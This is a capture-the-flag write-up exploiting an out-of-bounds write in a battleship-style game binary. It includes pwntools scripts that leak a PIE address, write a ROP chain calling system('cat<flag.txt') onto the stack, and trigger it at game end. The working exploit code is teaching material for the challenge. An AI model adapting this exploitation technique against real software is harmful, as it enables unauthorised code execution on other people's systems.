# Write-Up: Adventure! on the High C

The program suffers an out-of-bound vulnerability that grants arbitrary read and arbitrary write.

```
Enter the row (0-9, a-f) >>> -1
Enter the column (0-9, a-f) >>> -1
Choose missile type - Tomahawk (T), Hellfire (H), SideWinder (S), Custom (C) >>> C
Enter a custom missile as a single ASCII character >>> A
<<< Fired outside board, corrupting 0x7ffe30f641ef from 00 to 41!
```

Just go ahead and automate finding leaks:

```python

def ret_leak(offset):
    addr = b''
    for i in range(offset,offset+8):
        p.sendlineafter(b'Enter the row (0-9, a-f) >>>',f'-1'.encode(),timeout=TIMEOUT)
        p.sendlineafter(b'Enter the column (0-9, a-f) >>>',f'{i+offset}'.encode(),timeout=TIMEOUT)
        p.sendlineafter(b'Custom (C) >>>',b'C',timeout=TIMEOUT)
        p.sendlineafter(b'ASCII character >>>',b'H',timeout=TIMEOUT)
        p.recvuntil(b'<<< Fired outside board, corrupting')
        p.recvuntil(b'from ')
        addr=p.recv(2)+addr

    addr = int(addr,16)
    return addr

def ret_leaks():
    for i in range(0,600,8):
        addr=ret_leak(i)
        log.info(f'Offset: {i}, Addr: {hex(addr)}')
```

This ends up leaking a ``PIE`` address at offset ``312``. Since the program has full RELRO, we cannot overwrite the GOT. However, it does appear to have several useful ``strings``, a ``pop rdi, ret`` gadget, and a ``system plt entry``. So we can probably write a useful ROP chain directly to the stack.

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

After playing with it for a while, you should be able to find a decent location to write my gadget. I discovered a location that was triggered onbly after the game ended. 

```python
    stack_write(chain,offset)
    end_game()
```

A couple pitfalls that I ran into. On initial remote testing, the server was terminating the connection prior to outputing the results of ``cat flag.txt``. So I added a ``sleep 60`` for the players. 

```python
chain = p64(ret)*4
chain += p64(pop_rdi)
chain += p64(sh) # cat flag.txt
chain += p64(ret)
chain += p64(system) system('cat flag.txt')
chain += p64(ret)*4
chain += p64(pop_rdi)
chain += p64(slep) # sleep 60
chain += p64(ret)
chain += p64(system) system('sleep 60')
```

Also there are some bad bytes that cannot be used. I just added a check in my script to determine if they get picked up and I terminate and try again.

```python
def chain_has_bad_bytes(chain):
    bad_bytes = bytes([0x09, 0x0A, 0x0B, 0x0C, 0x20])
    if any(b in chain for b in bad_bytes):
        return True
    return False
```

Final script follows

```python
from pwn import *
import sys

binary = args.BIN
context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary,checksec=False)

if args.REMOTE:
    TIMEOUT = 0.5
else:
    TIMEOUT = 0.1

gs = '''
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        HOST=args.HOST
        PORT=args.PORT
        return remote(HOST,PORT)
    else:
        return process(e.path)

def end_game():
    log.info('Carpet Bombing All Ships To End Game...')
    try:
        for i in range(256,512):
            p.sendlineafter(b'Enter the row (0-9, a-f) >>>',f'1'.encode(),timeout=TIMEOUT)
            p.sendlineafter(b'Enter the column (0-9, a-f) >>>',f'{i}'.encode(),timeout=TIMEOUT)
            p.sendlineafter(b'Custom (C) >>>',b'C',timeout=TIMEOUT)
            p.sendlineafter(b'ASCII character >>>',b'H',timeout=TIMEOUT)
    except:
        log.info('Bombing Run Complete')


def ret_leak(offset):
    addr = b''
    for i in range(offset,offset+8):
        p.sendlineafter(b'Enter the row (0-9, a-f) >>>',f'-1'.encode(),timeout=TIMEOUT)
        p.sendlineafter(b'Enter the column (0-9, a-f) >>>',f'{i+offset}'.encode(),timeout=TIMEOUT)
        p.sendlineafter(b'Custom (C) >>>',b'C',timeout=TIMEOUT)
        p.sendlineafter(b'ASCII character >>>',b'H',timeout=TIMEOUT)
        p.recvuntil(b'<<< Fired outside board, corrupting')
        p.recvuntil(b'from ')
        addr=p.recv(2)+addr

    addr = int(addr,16)
    return addr

'''
def ret_leaks():
    for i in range(0,600,8):
        addr=ret_leak(i)
        log.info(f'Offset: {i}, Addr: {hex(addr)}')
'''

def stack_write(chain,offset):
    try:
        log.info(f'Writing to Stack...')
        for i in range(0,len(chain)):
            p.sendlineafter(b'Enter the row (0-9, a-f) >>>',f'1'.encode(),timeout=TIMEOUT)
            p.sendlineafter(b'Enter the column (0-9, a-f) >>>',f'{i+offset}'.encode(),timeout=TIMEOUT)
            p.sendlineafter(b'Custom (C) >>>',b'C',timeout=TIMEOUT)
            p.sendlineafter(b'ASCII character >>>',bytes([chain[i]]),timeout=TIMEOUT)
    except:
        log.info("Lost before finished stack write. Try again.")
        sys.exit()
        
def chain_has_bad_bytes(chain):
    bad_bytes = bytes([0x09, 0x0A, 0x0B, 0x0C, 0x20])
    if any(b in chain for b in bad_bytes):
        return True
    return False

def throw_sploit():
    offset = 520
    pie_addr = ret_leak(312) 
    e.address=pie_addr-0x3d80
    log.info(f'PIE Base: {hex(e.address)}')

    r = ROP(e)
    pop_rdi = r.find_gadget(['pop rdi','ret'])[0]
    ret = r.find_gadget(['ret'])[0]
    sh =next(e.search(b'cat<flag.txt\0'))
    slep =next(e.search(b'sleep 60\0'))
    system = e.sym['system']

    log.info(f'Ret Gadget: {hex(ret)}')
    log.info(f'Pop RDI Gadget: {hex(pop_rdi)}')
    
    chain = p64(ret)*4
    chain += p64(pop_rdi)
    chain += p64(sh)
    chain += p64(ret)
    chain += p64(system)
    chain += p64(ret)*4
    chain += p64(pop_rdi)
    chain += p64(slep)
    chain += p64(ret)
    chain += p64(system)

    if chain_has_bad_bytes(chain):
       log.warn(f'Try Again. Bad Byte in Gadgets')
       p.close()
       return False

    stack_write(chain,offset)
    end_game()
    p.interactive()
    return True

while True:
    p = start()
    sploit_landed = throw_sploit()
    if sploit_landed or args.GDB:
        break
```
